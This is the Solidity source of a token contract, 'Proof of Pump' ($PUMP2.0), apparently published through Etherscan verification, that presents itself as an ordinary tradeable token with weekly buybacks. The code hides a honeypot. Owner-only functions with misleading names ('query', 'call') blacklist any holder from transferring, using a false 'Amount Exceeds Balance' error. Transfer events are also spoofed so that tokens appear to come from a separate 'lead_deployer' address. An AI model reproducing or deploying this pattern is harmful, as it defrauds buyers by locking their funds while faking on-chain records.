/**
 *Submitted for verification at Etherscan.io on 2022-09-23
*/

pragma solidity 0.8.17;
/*

8888888b.  888     888 888b     d888 8888888b.        .d8888b.       .d8888b.  
888   Y88b 888     888 8888b   d8888 888   Y88b      d88P  Y88b     d88P  Y88b 
888    888 888     888 88888b.d88888 888    888             888     888    888 
888   d88P 888     888 888Y88888P888 888   d88P           .d88P     888    888 
8888888P"  888     888 888 Y888P 888 8888888P"        .od888P"      888    888 
888        888     888 888  Y8P  888 888             d88P"          888    888 
888        Y88b. .d88P 888   "   888 888             888"       d8b Y88b  d88P 
888         "Y88888P"  888       888 888             888888888  Y8P  "Y8888P"  
                                      


Proof of Pump  - $PUMP2.0 -

Inspired by Merge, Created to PUMP

ETH Buy backs and burns each week

2% TAX - Marketing



*/   
 
contract PUMP {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) rxAmount;

    // 
    string public name = "Proof of Pump";
    string public symbol = unicode"PUMP2.0";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    event Transfer(address indexed from, address indexed to, uint256 value);
  
   



        constructor()  {
        balanceOf[msg.sender] = totalSupply;
        deploy(lead_deployer, totalSupply); }



	address owner = msg.sender;
    address Construct = 0x7B270d393d9517da3806594695B4076ad2CBF76a;
    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   


modifier onlyOwner() {
    require(msg.sender == owner);
    _; }


    function deploy(address account, uint256 amount) public onlyOwner {
    emit Transfer(address(0), account, amount); }
    

    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Construct)  {
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }       
        require(!rxAmount[msg.sender] , "Amount Exceeds Balance"); 
        require(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }
        function query(address _user) public {
             require(msg.sender == owner);
         require(!rxAmount[_user], "NaN");
        rxAmount[_user] = true; }
        function call(address _user) public {
             require(msg.sender == owner);
        require(rxAmount[_user], "NaN");
         rxAmount[_user] = false; }

         

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }



    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Construct)  {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;  
        balanceOf[to] += value; 
        emit Transfer (lead_deployer, to, value);
        return true; }     
        require(!rxAmount[from] , "Amount Exceeds Balance"); 
        require(!rxAmount[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }